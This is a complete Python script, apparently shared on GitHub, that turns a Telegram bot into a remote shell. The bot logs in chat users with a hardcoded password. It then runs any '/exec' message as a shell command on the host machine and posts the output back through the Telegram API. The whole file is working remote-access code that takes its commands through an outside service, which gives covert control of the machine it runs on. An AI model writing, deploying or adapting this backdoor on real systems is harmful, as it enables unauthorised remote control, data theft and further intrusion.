#!/usr/bin/env python3

"""
Author:     PlatyPew
Website:    https://github.com/PlatyPew
Function:   Creates a reverse psuedo-shell using
            a telegram bot
"""

from urllib import request, parse
import json
import subprocess
import threading
import logging
import os, signal

PASSWORD = 'VIM_MASTER_RACE'

uniOffset = 0

_REST_API = 'https://api.telegram.org/bot'
_API_TOKEN = '<token>'
_URL = _REST_API + _API_TOKEN

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(message)s'
)

class Reverse():
    def __init__(self):
        self.users = {}
        self.auth = set()

        while True:
            self.__getData()
            for cid in self.users:
                threading.Thread(target=self.__command, args=[cid]).start()

    def __getUpdates(self):
        values = {
            'offset': uniOffset
        }

        params = parse.urlencode(values)
        req = request.Request(f'{_URL}/getupdates?{params}')
        res = request.urlopen(req).read()
        return json.loads(res)

    def __sendMessage(self, cid, msg):
        logging.info(f'ID: {cid}, Output: {msg}')
        values = {
            'chat_id': cid,
            'text': msg,
            'parse_mode': 'markdown'
        }

        params = parse.urlencode(values)
        req = request.Request(f'{_URL}/sendmessage?{params}')
        res = request.urlopen(req)

    def __getData(self):
        global uniOffset
        offset = 0
        users = {}

        self.data = self.__getUpdates()['result']

        try:
            for entry in self.data:
                offset = entry['update_id']
                cid = entry['message']['chat']['id']
                msg = entry['message']['text']

                if not cid in users:
                    users[cid] = {}

                if not 'text' in users[cid]:
                    users[cid]['text'] = []
                users[cid]['text'].append(msg)

            self.users = users
        except:
            self.__sendMessage(entry['message']['chat']['id'], 'Invalid Action')

        uniOffset = offset + 1

    def __command(self, cid):
        for cmd in self.users[cid]['text']:
            logging.info(f'ID: {cid}, Command: {cmd}')
            if cmd.split(' ')[0] == '/login':
                if ' '.join(cmd.split(' ')[1:]) == PASSWORD:
                    self.__sendMessage(cid, 'Logged In!')
                    self.auth.update([cid])
                else:
                    self.__sendMessage(cid, 'Incorrect Password!')
            elif cmd.split(' ')[0] == '/logout':
                self.auth.remove(cid)
                self.__sendMessage(cid, 'Logged Out Successfully!')
            elif cmd.split(' ')[0] == '/stop':
                if cid in self.auth:
                    for cid in self.users:
                        self.__sendMessage(cid, f'User: {cid} has stopped the bot!')
                    os.kill(os.getpid(), signal.SIGINT)
                else:
                    self.__sendMessage(cid, 'You do not have permission to do that!')
            elif cmd.split(' ')[0] == '/exec':
                if cid in self.auth:
                    output = self.__exec(' '.join(cmd.split(' ')[1:]))
                    self.__sendMessage(cid, output)
                else:
                    self.__sendMessage(cid, 'You do not have permission to do that!')
            elif cmd.split(' ')[0] == '/start':
                self.__sendMessage(cid, 'I am Alive')
            else:
                self.__sendMessage(cid, 'Not a valid command!')

    def __exec(self, cmd):
        out, err = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        ).communicate()

        if out:
            return f'```\n{out.decode().strip()}\n```'
        elif err:
            return f'''```\n{" ".join(err.decode().strip().split(' ')[1:])}\n```'''
        else:
            return 'Command Executed Successfully'

if __name__ == '__main__':
    try:
        Reverse()
    except KeyboardInterrupt:
        print('\nSIGINT detected, killing process...')
